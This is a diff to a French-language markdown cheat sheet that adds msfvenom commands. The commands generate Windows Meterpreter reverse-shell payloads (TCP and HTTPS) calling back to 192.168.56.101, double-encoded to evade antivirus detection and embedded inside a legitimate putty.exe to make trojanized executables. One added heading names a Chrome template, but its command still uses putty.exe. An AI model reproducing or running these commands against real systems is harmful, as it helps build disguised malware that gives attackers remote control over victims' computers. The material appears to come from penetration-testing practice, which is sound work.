@@ -377,10 +377,18 @@ msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.56.101 LPORT=443
 msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -e x64/xor_dynamic -i 10 -f raw | msfvenom -a x64 --platform windows -e x86/shikata_ga_nai -i 10 -f exe -o /home/kali/Desktop/double_encoded.exe
 ```
 
+### DOUBLE ENCODAGE + TEMPLATE putty (preque la meilleur commande)
+
 ```bash
 # Double encodage + Template Putty
 msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -e x64/xor_dynamic -i 10 -f raw | msfvenom -a x64 --platform windows -e x86/shikata_ga_nai -i 10 -x /root/putty.exe -k -f exe -o /home/kali/Desktop/double_encoded_putty.exe
 ```
+
+### DOUBLE ENCODAGE + TEMPLATE CHROME + HTTPS (la meilleur commande)
+
+````bash
+msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.56.101 LPORT=443 -e x64/xor_dynamic -i 10 -f raw | msfvenom -a x64 --platform windows -e x86/shikata_ga_nai -i 10 -x /root/putty.exe -k -f exe -o /home/kali/Desktop/putty_ultimate.exe
+````
 
 je me suis beaucoup entrainer -__-
 
